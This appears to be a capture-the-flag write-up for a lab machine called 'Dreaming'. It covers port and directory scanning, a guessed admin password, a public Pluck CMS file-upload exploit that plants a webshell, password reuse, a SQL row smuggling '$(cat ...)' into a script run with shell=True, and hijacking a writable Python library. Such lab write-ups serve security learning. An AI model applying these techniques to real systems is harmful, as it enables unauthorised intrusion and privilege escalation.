{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start off by scanning all the ports.")}}

{{console("nmap -T5 -p- 10.10.2.104", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 04:47 CET
Host is up (0.082s latency).
Not shown: 62276 closed tcp ports (conn-refused), 3257 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 552.74 seconds
")}}

{{text("We discover 2 open ports: ")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{text("We visit the website on port 80.")}}

{{image("../../static/writeups/dreaming/images/000001.jpg")}}

{{text("It is a default page for Apache2. I tried looking at the source code to check if it maybe was modified, but that wasn't the case.")}}

{{header("Shell as www-data", "shell-as-www-data")}}

{{text("Let's proceed by scanning for any directories.")}}

{{console("gobuster dir -u http://10.10.2.104 -w /usr/share/wordlists/dirb/common.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.2.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/app                  (Status: 301) [Size: 308] [--> http://10.10.2.104/app/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 276]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================")}}

{{text("We find the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>app</code> directory in which we find a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>pluck</code> folder.")}}

{{image("../../static/writeups/dreaming/images/000002.jpg")}}

{{text("By clicking on the folder, we get redirected to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/app/pluck-4.7.13/?file=dreaming</code> page that has nothing of interest.")}}

{{image("../../static/writeups/dreaming/images/000003.jpg")}}

{{text("We continue with directory scanning.")}}

{{console("gobuster dir -u http://10.10.2.104/app/pluck-4.7.13 -w /usr/share/wordlists/dirb/common.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.2.104/app/pluck-4.7.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/admin.php            (Status: 200) [Size: 3741]
/data                 (Status: 301) [Size: 326] [--> http://10.10.2.104/app/pluck-4.7.13/data/]
/docs                 (Status: 301) [Size: 326] [--> http://10.10.2.104/app/pluck-4.7.13/docs/]
/files                (Status: 301) [Size: 327] [--> http://10.10.2.104/app/pluck-4.7.13/files/]
/images               (Status: 301) [Size: 328] [--> http://10.10.2.104/app/pluck-4.7.13/images/]
/index.php            (Status: 302) [Size: 0] [--> http://10.10.2.104/app/pluck-4.7.13/?file=dreaming]
/robots.txt           (Status: 200) [Size: 47]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================")}}

{{text("I tried going to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/admin.php</code> but instead I got redirected to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>login.php</code> because I wasn't logged in. It contained a form with a password field into which I typed most common passwords I could think of and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>password</code> as password worked.")}}

{{image("../../static/writeups/dreaming/images/000004.jpg")}}

{{text("After that I started searching for an exploit for <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>pluck 4.7.13</code>")}}

{{link("https://www.exploit-db.com/exploits/49909", "https://www.exploit-db.com/favicon.ico", "Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)")}}

{{text("This should allow us to get a reverse shell on the target.")}}

{{text("We save the exploit into a file and run it with the correct arguments.")}}

{{console("python3 exploit.py 10.10.2.104 80 password /app/pluck-4.7.13", "Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://10.10.2.104:80/app/pluck-4.7.13/files/shell.phar")}}

{{text("We now go to the provided URL, and have a functioning reverse shell.")}}

{{image("../../static/writeups/dreaming/images/000005.jpg")}}

{{header("Shell as lucien", "shell-as-lucien")}}

{{text("For better access we can get a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>nc mkfifo</code> reverse shell from <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code>, setup a netcat listener and execute it. Then we can upgrade our shell.")}}

{{image("../../static/writeups/dreaming/images/000006.jpg")}}

{{text("I was looking through the system files when I found a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>test.py</code> file inside of <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/opt</code> directory.")}}

{{image("../../static/writeups/dreaming/images/000007.jpg")}}

{{text("I already knew a user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>lucien</code> existed from reading <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/passwd</code> file so I wondered if he reused his passwords and I was right.")}}

{{image("../../static/writeups/dreaming/images/000008.jpg")}}

{{header("Shell as death", "shell-as-death")}}

{{text("I checked our current user's sudo permissions since we knew his password.")}}

{{console("sudo -l", "Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py")}}

{{text("We can run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/home/death/getDreams.py</code> with python as the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>death</code> user. I previously found a file with the same name inside of the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/opt</code> directory.")}}

{{console("cat /opt/getDreams.py", "import mysql.connector
import subprocess

# MySQL credentials
DB_USER = 'death'
DB_PASS = '#redacted'
DB_NAME = 'library'

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host='localhost',
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = 'SELECT dreamer, dream FROM dreams;'

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print('No dreams found in the database.')
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f'echo {dreamer} + {dream}'
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f'Error: {error}')

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()")}}

{{text("Script retrieves data from a database and outputs the results.")}}

{{console("sudo -u death /usr/bin/python3 /home/death/getDreams.py", "Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician")}}

{{text("By reading <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.bash_history</code> file inside of our home directory, we find a password to MySQL database.")}}

{{text("We find the same data that gets outputted when we run the script.")}}

{{image("../../static/writeups/dreaming/images/000009.jpg")}}

{{text("If we add our own command in here, it should get executed when we run the script.")}}

{{text("We add a new value into the table that will read the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/home/death/getDreams.py</code> file to us since it should contain user's <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>death</code> password.")}}

{{console("INSERT INTO dreams (dreamer, dream) VALUES ('password', '$(cat /home/death/getDreams.py)');")}}

{{text("Now when we run the script again, it should read the whole file to us including the password.")}}

{{text("We use that password and log in as <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>death</code>.")}}

{{image("../../static/writeups/dreaming/images/000010.jpg")}}

{{header("Last flag", "last-flag")}}

{{text("I downloaded <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>pspy64</code> in order to check for any background processes and found this.")}}

{{image("../../static/writeups/dreaming/images/000011.jpg")}}

{{console("cat restore.py", "from shutil import copy2 as backup

src_file = '/home/morpheus/kingdom'
dst_file = '/kingdom_backup/kingdom'

backup(src_file, dst_file)
print('The kingdom backup has been done!')")}}

{{text("This script just creates a backup by copying files, nothing exploitable. I knew there had to be something so i kept looking.")}}

{{text("I focused on the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>shutil</code> library that gets imported.")}}

{{text("I found out it belonged to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>death</code> group so we should be able to edit it.")}}

{{text("I added a line that will add all the permissions to the last flag inside of the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>copy2</code> function that the script imports.")}}

{{image("../../static/writeups/dreaming/images/000012.jpg")}}

{{text("After waiting for a while, we should be able to read the last flag.")}}

{{script()}}